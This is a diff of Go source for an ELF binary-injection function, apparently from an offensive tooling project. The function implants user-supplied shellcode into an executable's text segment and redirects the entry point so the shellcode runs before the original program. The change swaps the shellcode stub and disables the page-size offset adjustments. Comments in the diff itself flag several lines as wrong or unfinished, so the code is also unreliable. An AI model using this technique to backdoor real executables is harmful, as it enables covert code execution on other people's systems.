@@ -64,13 +64,14 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 					into the file - text segment p_offset + p_filesz (original)
 	*/
 
-	PAGE_SIZE := uint64(4096)
+	//PAGE_SIZE := uint64(4096)
+
 	scAddr := uint64(0)
 	sclen := uint64(0)
 	shellcode := []byte{}
 
 	// 6. Increase p_shoff by PAGE_SIZE in the ELF header
-	elfFile.FileHeader.SHTOffset += int64(PAGE_SIZE)
+	//elfFile.FileHeader.SHTOffset += int64(PAGE_SIZE)
 
 	afterTextSegment := false
 	for _, p := range elfFile.Progs {
@@ -78,7 +79,10 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 		if afterTextSegment {
 			//2. For each phdr which is after the insertion (text segment)
 			//-increase p_offset by PAGE_SIZE
-			p.Off += PAGE_SIZE
+
+			// todo: this doesn't match the diff
+			//p.Off += sclen //PAGE_SIZE
+
 		} else if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
 			// 1. Locate the text segment program header
 			// -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
@@ -109,9 +113,10 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 			}
 
 			// 7. Patch the insertion code (parasite) to jump to the entry point (original)
-			shellcode = api.ApplyPrefixForkIntel64(userShellCode, uint32(originalEntry), elfFile.ByteOrder)
-			sclen = uint64(len(shellcode))
+			scAddr = p.Vaddr + p.Filesz
+			shellcode = api.ApplySuffixJmpIntel64(userShellCode, uint32(scAddr), uint32(originalEntry), elfFile.ByteOrder)
 
+			sclen = uint64(len(shellcode))
 			log.Println("Shellcode Length: ", sclen)
 
 			// -Increase p_filesz to account for the new code (parasite)
@@ -119,7 +124,6 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 			// -Increase p_memsz to account for the new code (parasite)
 			p.Memsz += sclen
 
-			scAddr = p.Off + p.Filesz
 			afterTextSegment = true
 		}
 	}
@@ -132,7 +136,7 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 		if s.Addr > scAddr {
 			// 4. For each shdr which is after the insertion
 			//	-Increase sh_offset by PAGE_SIZE
-			s.Offset += PAGE_SIZE
+			//todo: this ain't right s.Offset += PAGE_SIZE
 
 		} else if s.Size+s.Addr == scAddr { // assuming entry was set to (p_vaddr + p_filesz) above
 			//	-increase sh_len by the parasite length
